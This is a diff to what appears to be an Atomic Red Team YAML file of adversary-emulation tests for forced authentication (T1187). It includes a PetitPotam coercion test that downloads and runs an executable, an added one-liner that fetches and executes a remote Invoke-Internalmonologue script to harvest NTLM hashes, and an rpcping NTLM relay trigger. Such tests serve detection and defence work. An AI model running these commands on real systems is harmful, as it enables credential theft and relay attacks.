@@ -1,5 +1,5 @@
 attack_technique: T1187
-display_name: Forced Authentication
+display_name: "Forced Authentication"
 atomic_tests:
 - name: PetitPotam
   auto_generated_guid: 485ce873-2e65-4706-9c7e-ae3ab9e14213
@@ -18,12 +18,12 @@ atomic_tests:
       default: 10.0.0.2
     efsApi:
       description: EFS API to use to coerce authentication
-      type: string
+      type: integer
       default: 1
     petitpotam_path:
       description: PetitPotam Windows executable
       type: path
-      default: '$env:TEMP\PetitPotam.exe'
+      default: 'PathToAtomicsFolder\..\ExternalPayloads\PetitPotam.exe'
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -32,10 +32,42 @@ atomic_tests:
     prereq_command: |
       if (Test-Path "#{petitpotam_path}") { exit 0 } else { exit 1 }
     get_prereq_command: |
-      Invoke-WebRequest "https://github.com/topotam/PetitPotam/blob/2ae559f938e67d0cd59c5afcaac67672b9ef2981/PetitPotam.exe?raw=true" -OutFile "#{petitpotam_path}"
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://github.com/topotam/PetitPotam/blob/2ae559f938e67d0cd59c5afcaac67672b9ef2981/PetitPotam.exe?raw=true" -OutFile "#{petitpotam_path}" -UseBasicParsing
   executor:
     name: powershell
     elevation_required: false
     command: |
       & "#{petitpotam_path}" #{captureServerIP} #{targetServerIP} #{efsApi}
       Write-Host "End of PetitPotam attack"
+- name: WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS
+  auto_generated_guid: 7f06b25c-799e-40f1-89db-999c9cc84317
+  description: PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS technique via function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')
+      Invoke-Internalmonologue -command "-Downgrade true -impersonate true -restore true"
+    name: powershell
+
+- name: Trigger an authenticated RPC call to a target server with no Sign flag set
+  auto_generated_guid: 81cfdd7f-1f41-4cc5-9845-bb5149438e37
+  description: |-
+    RpcPing command can be used to trigger an authenticated RPC call to the target server (/s) that could be relayed to a privileged resource (Sign flag not Set)
+    Ref: https://twitter.com/splinter_code/status/1421144623678988298
+  supported_platforms:
+  - windows
+  input_arguments:
+    custom_port:
+      description: Specify the custom port number
+      type: integer
+      default: "9997"
+    server_ip:
+      description: Specify the server IP address. If not specified, the loop back IP will be used
+      type: string
+      default: 127.0.0.1
+  executor:
+    command: 'rpcping -s #{server_ip} -e #{custom_port} /a connect /u NTLM 1>$Null'
+    name: powershell
+    elevation_required: false
